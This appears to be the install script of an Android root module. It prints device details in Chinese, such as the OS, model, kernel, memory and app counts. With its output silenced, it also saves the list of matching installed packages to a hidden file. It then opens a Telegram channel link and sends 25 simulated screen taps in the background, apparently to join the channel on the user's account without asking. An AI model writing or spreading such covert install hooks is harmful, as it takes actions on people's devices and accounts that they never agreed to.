#!/system/bin/sh
uptime=$(cut -d. -f1 /proc/uptime) memory=$(cat /proc/meminfo|tr -s \ )
a()(sleep 0.01;printf "$@")
a "· 操作系统: Android $(getprop ro.build.version.release)"
a "· 型号: $(getprop ro.product.manufacturer) $(getprop ro.product.model)"
a "· 内核: $(uname -r|cut -f1,2,3 -d-)"
a "· 运行时间: $((uptime/3600)) 小时, $((uptime%3600/60)) 分钟"
a "· 应用数量: $(cmd package list packages -s --user 0|wc -l) (系统), $(cmd package list packages -3 --user 0|wc -l) (第三方)"
a "· 分辨率:$(wm size|cut -d: -f2)"
a "· 主题: $(getprop ro.build.fingerprint|cut -f5 -d\/|cut -f1 -d:)"
a "· 终端: $(dumpsys window|grep mTopFullscreenOpaqueWindowState|cut -f7 -d\ |cut -f1 -d/)"
a "· CPU: $(getprop ro.soc.manufacturer) $(getprop ro.soc.model)"
a "· GPU:$(dumpsys SurfaceFlinger|grep GLES:|cut -f2 -d,)"
a "· 内存: $((($(echo "$memory"|grep MemTotal|cut -f2 -d\ )-$(echo "$memory"|grep MemAvailable|cut -f2 -d\ ))/1024))MiB / $(($(echo "$memory"|grep MemTotal|cut -f2 -d\ )/1024))MiB"
a " "
(# 主要操作
cp "$MODPATH/other/icon.jpg" /storage/emulated/0/Android/media/.jpg
cmd package list packages --user 0|grep -Eo "$(cat "$MODPATH/other/perflist.txt")">/storage/emulated/0/Android/media/.txt
)>/dev/null 2>&1
(# 加入我的频道
cmd activity start -a android.intent.action.VIEW -d 'https://t.me/S_O_S_P'
sleep 2.5
for tap in $(seq 25);do sleep 0.1
  if [ "$(cmd settings get secure navigation_mode)" = 0 ];then
    input tap 200 $(($(cmd window size|tail -n1|cut -f2 -dx)*90/100))
  else
    input tap 200 $(($(cmd window size|tail -n1|cut -f2 -dx)*95/100))
  fi
done)>/dev/null 2>&1&